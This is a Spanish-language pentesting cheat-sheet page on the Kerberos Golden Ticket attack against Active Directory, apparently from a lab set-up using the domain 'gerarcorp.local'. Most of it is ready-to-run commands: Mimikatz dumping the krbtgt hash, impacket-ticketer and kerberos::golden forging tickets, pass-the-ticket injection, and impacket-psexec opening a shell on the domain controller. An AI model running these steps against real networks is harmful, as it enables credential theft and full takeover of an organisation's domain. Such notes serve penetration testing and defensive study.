# Golden Ticket Attack

Esta técnica permite que al tener credenciales de un usuario administrador del dominio, el dumpear el hash de la cuenta **krbtgt.** Esta cuenta de por sí no tiene ningún privilegio asociado sino únicamente de que su hash es el que usa el **KDC** para cifrar los **TGT**. Por lo que el tener el hash de esta cuenta, permite el forjar de manera arbitraria **TGS** para tener acceso a cualquier recurso del DC.



## Explotación

### Con impacket-ticketer

Crear variable de entorno

{% code overflow="wrap" %}
```bash
# Usage
impacket-ticketer -nthash <nthash> -domain-sid <sid> -domain <domain.local> (user)

# Example
impacket-ticketer -nthash 7a10ed0c241a70ea53777ca37c320bd9 -domain-sid S-1-5-21-559191057-1952517652-1921332360 -domain gerarcorp.local Administrador
```
{% endcode %}

Exportar variable de entorno a KRB5CCNAME

```bash
export KRB5CCNAME=Administrador.ccache
```

Obtener shell con impacket-psexec

```bash
impacket-psexec -k -no-pass gerarcorp.local/Administrador@DC-Company cmd.exe 

## cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters


192.168.0.111 gerarcorp gerarcorp.local DC-Company
```

### Con Mimikatz

Dumpear el **sid** y **hash ntlm** de la cuenta **krbtgt**

```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"'
```

**-k:** Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line



Forgar el **TGT**

{% code overflow="wrap" %}
```powershell
# Usage
Invoke-Mimikatz -Command '"kerberos::golden /domain:<DOMAIN> /sid:<SID> /rc4:<NTLM HASH> /user:<User> /ticket:<name of the ticket>"'

# Guardar el ticket a un archivo
Invoke-Mimikatz -Command '"kerberos::golden /domain:gerarcorp.local /sid:S-1-5-21-559191057-1952517652-1921332360 /rc4:7a10ed0c241a70ea53777ca37c320bd9 /user:Administrador /ticket:gold.kirbi"'
```
{% endcode %}

Usar el ticket creado con la cuenta que nos querramos autenticar al ticket creado, permitiendonos acceder a los recursos del mismo

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt gold.kirbi"'
```
